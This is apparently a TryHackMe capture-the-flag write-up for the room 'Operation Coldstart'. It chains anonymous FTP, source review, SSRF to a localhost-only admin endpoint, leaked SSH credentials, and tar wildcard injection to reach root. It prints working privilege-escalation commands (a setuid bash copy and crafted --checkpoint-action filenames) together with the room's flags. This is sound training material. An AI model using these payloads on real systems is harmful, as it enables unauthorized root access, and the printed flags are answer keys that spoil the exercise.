# THM: Operation Coldstart

## 1. Room Information

- **Name:** Operation Coldstart
- **Platform:** TryHackMe
- **Difficulty:** Premium / Junior Penetration Tester pathway
- **Focus:** FTP enumeration, source code review, SSRF, credential leakage, SSH access, and Linux privilege escalation

---

## 2. Introduction

Operation Coldstart was a good example of how multiple small weaknesses can be chained together to completely compromise a Linux server.

My attack path was:

```text
Anonymous FTP
      |
      v
backup.tar.gz
      |
      v
Source Code Review
      |
      v
SSRF
      |
      v
Internal Admin Endpoint
      |
      v
SSH Credentials
      |
      v
webdev User
      |
      v
Tar Wildcard Injection
      |
      v
Root
```

The two main vulnerabilities I focused on were:

- **Server-Side Request Forgery (SSRF)**
- **Tar wildcard injection / option injection**

---

# 3. Reconnaissance

The target IP was:

```text
10.48.165.95
```

I started with a full Nmap scan and service enumeration:

```bash
nmap -p- -A -T4 10.48.165.95
```

The scan revealed two interesting services:

| Port | Service | Notes |
|---|---|---|
| 21 | FTP | Anonymous access allowed |
| 80 | HTTP | Web application |

The anonymous FTP access immediately stood out because it could potentially expose files that were not intended to be publicly accessible.

---

# 4. Anonymous FTP Enumeration

I connected to the FTP service:

```bash
ftp 10.48.165.95
```

When prompted for credentials, I used:

```text
Username: anonymous
Password: [Press Enter]
```

After logging in, I checked the available directories:

```text
ftp> cd pub
ftp> ls
```

I found:

```text
backup.tar.gz
```

The file permissions and location suggested that this could be a backup of the web application.

I downloaded it:

```text
ftp> get backup.tar.gz
```

This gave me something much more useful than simply enumerating the FTP service: **the application's source code**.

---

# 5. Source Code Review

After extracting `backup.tar.gz`, I found the source code for the web application.

The application was written in **Python using Flask**.

Instead of immediately attacking the web application blindly, I reviewed the source code to understand its intended functionality and security controls.

Two areas immediately caught my attention:

1. The URL Preview functionality.
2. The internal `/admin/` endpoint.

---

# 6. Understanding the URL Preview Function

The application allowed users to submit a URL that the server would fetch.

The source code contained a whitelist:

```python
ALLOWED_HOSTS = {"kestrel.thm"}
```

The intention was to only allow requests to the trusted internal hostname:

```text
kestrel.thm
```

The source code also indicated that this hostname resolved to:

```text
127.0.0.1
```

through the server's `/etc/hosts`.

At first glance, the hostname whitelist appeared to provide protection against arbitrary requests.

However, I needed to understand what the server itself could access.

---

# 7. Discovering the Internal Admin Endpoint

The source code contained an internal administrative route:

```python
@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)

    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
```

The important security check was:

```python
if not request.remote_addr.startswith("127."):
    abort(403)
```

This meant that the `/admin/notes` endpoint was intended to be accessible only from localhost.

If I accessed it directly from my machine, the request would originate from my own IP rather than `127.0.0.1`, so the application would return:

```text
403 Forbidden
```

This made the URL Preview functionality interesting.

---

# 8. SSRF

## 8.1 Why SSRF Was Possible

The URL Preview feature made the **server perform the HTTP request on my behalf**.

Because `kestrel.thm` resolved internally to `127.0.0.1`, I could ask the application to request:

```text
http://kestrel.thm/admin/notes
```

The important distinction was:

```text
My Machine
    |
    | URL Preview request
    v
Web Server
    |
    | HTTP request
    v
kestrel.thm -> 127.0.0.1
    |
    v
/admin/notes
```

The `/admin/notes` application therefore saw the request as coming from localhost.

This bypassed the application's remote-address restriction.

This is a classic **Server-Side Request Forgery (SSRF)** scenario.

---

# 9. Exploiting the SSRF

I opened the web application:

```text
http://10.48.165.95
```

The page contained the URL Preview functionality.

I submitted:

```text
http://kestrel.thm/admin/notes
```

The server fetched the page internally and reflected the response back to me.

The response contained:

```text
=== INTERNAL ===
SSH access for staging:
user: webdev
pass: V0ltLabs#summer
- Mara
```

This was a major finding.

The SSRF allowed me to access an internal-only endpoint and retrieve **plaintext SSH credentials**.

---

# 10. Initial Access via SSH

Using the credentials obtained through SSRF, I connected to the server:

```bash
ssh webdev@10.48.165.95
```

Credentials:

```text
Username: webdev
Password: V0ltLabs#summer
```

I now had a shell as the low-privileged `webdev` user.

I checked the user flag:

```bash
cat user.txt
```

The result was:

```text
THM{96dc7bd50d2fb9fcece01560788b5ab}
```

### User Flag

```text
THM{96dc7bd50d2fb9fcece01560788b5ab}
```

---

# 11. Local Enumeration

With initial access established, I switched my focus from web exploitation to local privilege escalation.

I explored the filesystem and eventually found:

```text
/opt/backups
```

Inside this directory was a backup process that periodically executed a command similar to:

```bash
tar -czf backup.tar.gz *
```

This immediately caught my attention.

The important part was the use of:

```text
*
```

without protecting the command from filenames beginning with `-`.

---

# 12. Understanding Tar Wildcard Injection

The shell expands:

```bash
*
```

into the filenames present in the current directory.

For example, if the directory contains:

```text
file1
file2
file3
```

the command effectively becomes:

```bash
tar -czf backup.tar.gz file1 file2 file3
```

The problem occurs when a filename begins with a hyphen.

For example:

```text
--checkpoint=1
```

After wildcard expansion, `tar` can interpret that filename as an actual command-line option rather than as a normal file.

GNU `tar` provides options such as:

```text
--checkpoint
--checkpoint-action
```

which can be abused to execute commands.

If the vulnerable backup process runs as `root`, the injected command also executes with root privileges.

---

# 13. Preparing the Payload

I created a shell script:

```bash
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > shell.sh
```

I also added commands to copy the root flag somewhere that I could read:

```bash
echo "cp /root/flag.txt /tmp/flag.txt && chmod 777 /tmp/flag.txt" >> shell.sh
```

Then I made the script executable:

```bash
chmod +x shell.sh
```

The objective was to make the backup process execute `shell.sh` with root privileges.

---

# 14. Creating the Malicious Filenames

I created the filenames that would be interpreted by `tar` as options:

```bash
touch /opt/backups/--checkpoint=1
touch "/opt/backups/--checkpoint-action=exec=sh shell.sh"
```

The important idea was that these filenames would be included when the backup script expanded:

```bash
*
```

The resulting command would effectively contain arguments similar to:

```bash
tar -czf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh
```

Instead of treating everything as normal files, `tar` interpreted the specially crafted filenames as options.

---

# 15. Achieving Root

When the automated backup job executed, the malicious `tar` arguments triggered the checkpoint action.

The `shell.sh` script therefore executed with root privileges.

I checked `/tmp`:

```bash
ls /tmp/
```

I found:

```text
flag.txt
rootbash
```

The presence of `rootbash` and `flag.txt` confirmed that the payload had successfully executed.

I then read the copied root flag:

```bash
cat /tmp/flag.txt
```

The result was:

```text
THM{e6ee84a483d67ade06936fcfd1433e8a}
```

### Root Flag

```text
THM{e6ee84a483d67ade06936fcfd1433e8a}
```

---

# 16. Complete Attack Chain

```text
1. Nmap
   |
   +--> Port 21 FTP
   +--> Port 80 HTTP
   |
   v
2. Anonymous FTP
   |
   +--> backup.tar.gz
   |
   v
3. Source Code Review
   |
   +--> URL Preview
   +--> Internal /admin/notes
   +--> localhost-only restriction
   |
   v
4. SSRF
   |
   +--> http://kestrel.thm/admin/notes
   |
   v
5. Credential Leakage
   |
   +--> webdev:V0ltLabs#summer
   |
   v
6. SSH
   |
   +--> webdev
   |
   +--> user.txt
   |
   v
7. Local Enumeration
   |
   +--> /opt/backups
   +--> tar -czf backup.tar.gz *
   |
   v
8. Tar Wildcard Injection
   |
   +--> --checkpoint=1
   +--> --checkpoint-action=exec=sh shell.sh
   |
   v
9. Root Code Execution
   |
   +--> root flag
   +--> rootbash
```

---

# 17. Flags

```text
User:
THM{96dc7bd50d2fb9fcece01560788b5ab}

Root:
THM{e6ee84a483d67ade06936fcfd1433e8a}
```

---

# 18. Key Findings

| Vulnerability / Weakness | Impact |
|---|---|
| Anonymous FTP access | Allowed retrieval of application backup |
| Source code disclosure | Exposed application logic and security controls |
| SSRF | Allowed access to an internal-only endpoint |
| Internal admin endpoint | Exposed sensitive information |
| Plaintext credentials | Provided SSH access to `webdev` |
| Insecure backup command | Used an unsafe wildcard with `tar` |
| Tar wildcard injection | Allowed command execution as root |
| Combined attack chain | Resulted in complete system compromise |

---

# 19. Key Takeaways

The biggest lesson I took from this room was the importance of **chaining vulnerabilities**.

The SSRF by itself did not immediately give me a shell. Instead, it allowed me to access an internal endpoint that leaked credentials. Those credentials provided SSH access, which then gave me the ability to perform local enumeration.

The final privilege escalation also depended on understanding how the shell expands wildcards and how programs such as `tar` interpret command-line arguments.

The attack therefore followed a realistic penetration-testing mindset:

```text
Enumerate
   ↓
Find an unusual service
   ↓
Collect information
   ↓
Review source code
   ↓
Identify trust boundaries
   ↓
Exploit SSRF
   ↓
Obtain credentials
   ↓
Gain initial access
   ↓
Enumerate locally
   ↓
Identify a privileged automated task
   ↓
Understand how it processes user-controlled filenames
   ↓
Exploit it
   ↓
Root
```

The main things I want to remember from this room are:

- Anonymous FTP should always be checked for sensitive files.
- Source code can reveal vulnerabilities much faster than black-box testing alone.
- SSRF can be used to bypass IP-based access controls.
- Internal services should not automatically be trusted just because they are inaccessible externally.
- Credentials found during enumeration should be tested for legitimate access within the scope.
- Wildcards are expanded by the shell before the target program receives its arguments.
- Filenames beginning with `-` can sometimes be interpreted as command-line options.
- Automated root processes are especially dangerous when they process attacker-controlled files.
- A vulnerability does not always need to provide direct RCE to be critical; it can provide the next step in an attack chain.

Overall, Operation Coldstart reinforced the idea that **small configuration and trust-boundary mistakes can combine into complete machine compromise**.